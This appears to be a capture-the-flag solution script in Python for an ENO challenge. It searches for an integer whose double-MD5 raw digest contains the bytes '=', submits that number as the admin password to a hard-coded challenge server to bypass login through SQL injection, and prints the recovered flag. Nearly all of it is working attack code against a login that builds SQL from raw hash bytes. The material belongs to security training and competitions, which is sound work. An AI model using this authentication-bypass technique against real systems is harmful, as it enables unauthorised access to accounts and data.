#!/usr/bin/env python3
from hashlib import md5
import requests,re

SITE = "http://52.59.124.14:10028/"
REGEX = r'ENO{.*?}'

i = 0
while True:
    hash = bytes.fromhex(md5(bytes.fromhex(md5(f"{i}".encode()).hexdigest())).hexdigest())
    if b"'='" in hash:
        print(i)
        break
    i += 1

r = requests.post(SITE, data={'username':'admin', 'password':f"{i}"}) # will be 0'='0
flag = re.findall(REGEX, r.text)[0]
print(flag) # ENO{It's_always_MD5-N3ever_Trust_1t!}
